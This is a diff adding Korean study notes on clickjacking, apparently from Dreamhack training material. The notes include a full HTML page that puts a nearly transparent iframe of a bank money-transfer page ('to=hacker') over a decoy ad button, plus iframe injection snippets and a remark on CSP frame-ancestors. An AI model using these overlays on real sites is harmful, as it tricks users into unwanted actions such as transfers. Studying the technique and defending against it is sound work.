@@ -1,0 +1,65 @@
+HTML,CSS,JS 등 화면 출력에 영향을 미치는 요소들을 이용해 사용자의 눈을 속여 클릭을 유도
+    - 태그 엘리먼트(<frame>, <iframe>, <object>, <embed>, <applet>)를 사용
+
+    클릭 유도할 페이지 구성 후, 페이지 위에 iframe등 태그로 누르게 할 페이지 로드
+    css opacity(투명도)와 같이 사용자 눈에 보이지 않도록 숨겨서 유도.
+    실제 클릭과 보는 페이지의 차이는 iframe태그가 웹 브라우저 상에서 더 앞에 위치하기 때문
+
+ex)
+<!doctype html>
+<html>
+    <head>
+        <meta charset='utf-8'>
+    </head>
+    <body>
+        <div id="wrapper">
+            <div id="my-div">
+                <button id='my-button'>광고 끄기</button>
+                <img src="theori_tv.jpg" id='my-img'>
+            </div>
+            <iframe src="https://bank.dreamhack.io/send_money_preview?to=hacker&amount=10000" id="my-frame"></iframe>
+        </div>
+    <script>
+    </script>
+<style>
+button { width: 100px; height: 30px; }
+* { margin: 0; padding: 0; }
+#wrapper {
+    position: absolute;
+    top: calc(50% - 250px);
+    left: calc(50% - 250px);
+}
+#my-div {
+    position: absolute;
+    z-index: -9;
+    top: 118px;
+    left: 10px;
+}
+#my-img {
+    border: 1px solid blue;
+    width: 600px;
+    position: absolute;
+    left: 0;
+    z-index: -10;
+}
+#my-button {
+    width: 100px;
+    height: 100px;
+}
+#my-frame {
+    border: 1px solid red;
+    width: 300px;
+    height: 300px;
+    opacity: 0.1;
+}
+</style>
+    </body>
+</html>
+
+ex2)
+document.body.innerHTML = '<iframe src="https://example.dreamhack.io/test"></iframe>';
+
+document.body.innerHTML = '<iframe src="https://sandbox.dreamhack.io/dreamhack/frame-ancestors.php"></iframe>';
+
+[frame-ancestors 지시어의 값은 'self'로 동일 오리진만 허용 - https://www.google.com으로 인해 실패]
+
